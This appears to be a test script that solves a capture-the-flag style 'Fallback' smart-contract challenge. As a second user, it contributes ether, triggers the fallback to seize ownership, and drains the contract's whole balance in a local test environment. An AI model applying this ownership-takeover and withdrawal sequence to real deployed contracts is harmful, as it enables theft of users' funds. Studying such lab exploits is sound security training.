
import { accounts, contract } from '@openzeppelin/test-environment';
const { balance, ether } = require('@openzeppelin/test-helpers');
import assert = require('assert');

// Ethereum accounts used in these tests
const [
    owner, // Contract owner
    user1, // Random user
] = accounts;

// Loads a compiled contract using OpenZeppelin test-environment
const Fallback = contract.fromArtifact('Fallback');
let fallback: any;

beforeEach(async () => {
    fallback = await Fallback.new({from: owner});
});

it('claim ownership & reduce contract balance to 0', async () => {

    // Send some amount to pass 'contributions[msg.sender] > 0)'
    //await fallback.contribute({ from: user1, value: ethToWei('0.0005') });
    await fallback.contribute({ from: user1, value: ether('0.0005') });

    // Send some amount to non existing function to access the callback function
    // to get ownership
    await fallback.sendTransaction({ from: user1, value: ether('0.0001') });

    // Check contract balance BEFORE
    const balanceBefore = await balance.current(fallback.address);

    // Withdraw all funds
    await fallback.withdraw({ from: user1 });

    // Check contract balance AFTER
    const balanceAfter = await balance.current(fallback.address);

    assert(balanceBefore.toString() === ether('0.0006').toString(), 'Error 1');
    assert(balanceAfter.toString() === '0', 'Error 2');
});



